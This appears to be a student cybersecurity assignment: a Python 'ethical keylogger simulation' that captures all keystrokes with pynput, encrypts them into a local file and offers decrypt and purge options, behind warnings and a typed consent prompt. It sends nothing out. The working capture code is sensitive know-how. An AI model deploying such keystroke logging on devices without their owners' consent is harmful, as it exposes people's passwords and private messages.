"""
Ethical Keylogger Simulation — FOR USE ON YOUR OWN DEVICE ONLY
AVIP 2026 — CyberSecurity Task 3

⚠️ READ THIS BEFORE RUNNING ⚠️
This tool captures keystrokes typed on the machine it runs on and writes
them to a LOCAL, ENCRYPTED file. It is intended strictly as an educational
demonstration of how input-capture and secure local logging work.

DO NOT install or run this on any device you do not own or do not have
explicit, documented consent to test on. Unauthorized keystroke logging is
illegal in most jurisdictions (wiretapping / computer misuse laws) and is a
serious violation of privacy.

Before running this script you must:
  1. Only run it on a device you personally own, OR a device where you have
     explicit written consent from the owner.
  2. Fill out and keep `consent_declaration.txt` in this repo (see template).
  3. Purge captured logs (`--purge`) once your demonstration is complete.

This simulation uses the `pynput` library to capture keystrokes and
`cryptography` (Fernet/AES) to encrypt them before they touch disk.
"""

import argparse
import os
import sys
import datetime

try:
    from pynput import keyboard
except ImportError:
    keyboard = None

try:
    from cryptography.fernet import Fernet
except ImportError:
    Fernet = None

LOG_FILE = "keystrokes.log.enc"
KEY_FILE = "secret.key"


def load_or_create_key() -> bytes:
    if os.path.exists(KEY_FILE):
        with open(KEY_FILE, "rb") as f:
            return f.read()
    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as f:
        f.write(key)
    print(f"[+] New encryption key generated -> {KEY_FILE} (keep this private)")
    return key


def encrypt_and_append(fernet: "Fernet", text: str):
    token = fernet.encrypt(text.encode("utf-8"))
    with open(LOG_FILE, "ab") as f:
        f.write(token + b"\n")


def decrypt_log(fernet: "Fernet"):
    if not os.path.exists(LOG_FILE):
        print("No log file found.")
        return
    with open(LOG_FILE, "rb") as f:
        lines = f.readlines()
    print(f"=== Decrypted log ({len(lines)} entries) ===")
    for line in lines:
        line = line.strip()
        if not line:
            continue
        try:
            print(fernet.decrypt(line).decode("utf-8"))
        except Exception as e:
            print(f"[!] Could not decrypt entry: {e}")


def purge_logs():
    removed = []
    for f in (LOG_FILE, KEY_FILE):
        if os.path.exists(f):
            os.remove(f)
            removed.append(f)
    if removed:
        print(f"[+] Purged: {', '.join(removed)}")
    else:
        print("[i] Nothing to purge.")


def confirm_consent() -> bool:
    print("=" * 60)
    print("ETHICAL USE CONFIRMATION REQUIRED")
    print("=" * 60)
    ans = input(
        "Are you running this ONLY on your own device, with your own "
        "informed consent, purely for educational demonstration? (yes/no): "
    ).strip().lower()
    return ans == "yes"


def run_capture(duration: int):
    if keyboard is None or Fernet is None:
        print("[!] Missing dependencies. Install with:")
        print("    pip install pynput cryptography")
        sys.exit(1)

    if not confirm_consent():
        print("[-] Consent not confirmed. Exiting without capturing anything.")
        sys.exit(0)

    fernet = Fernet(load_or_create_key())
    buffer = []
    start_time = datetime.datetime.now()

    def flush_buffer():
        if buffer:
            text = "".join(buffer)
            timestamp = datetime.datetime.now().isoformat()
            encrypt_and_append(fernet, f"[{timestamp}] {text}")
            buffer.clear()

    def on_press(key):
        try:
            buffer.append(key.char)
        except AttributeError:
            buffer.append(f"[{key.name.upper()}]")
        if len(buffer) >= 20:
            flush_buffer()

    print(f"[+] Capturing keystrokes for {duration} seconds on THIS machine only.")
    print("[+] Press Ctrl+C to stop early.")
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    try:
        listener.join(timeout=duration)
    except KeyboardInterrupt:
        pass
    finally:
        listener.stop()
        flush_buffer()
        elapsed = (datetime.datetime.now() - start_time).seconds
        print(f"[+] Capture stopped after {elapsed}s. Encrypted log saved to {LOG_FILE}")


def main():
    parser = argparse.ArgumentParser(description="Ethical Keylogger Simulation (own system only)")
    parser.add_argument("--capture", type=int, metavar="SECONDS",
                         help="Capture keystrokes for N seconds on this machine")
    parser.add_argument("--decrypt", action="store_true", help="Decrypt and display the log")
    parser.add_argument("--purge", action="store_true", help="Delete log + key files")
    args = parser.parse_args()

    if args.purge:
        purge_logs()
    elif args.decrypt:
        if Fernet is None or not os.path.exists(KEY_FILE):
            print("[!] No key available to decrypt.")
            sys.exit(1)
        with open(KEY_FILE, "rb") as f:
            fernet = Fernet(f.read())
        decrypt_log(fernet)
    elif args.capture:
        run_capture(args.capture)
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
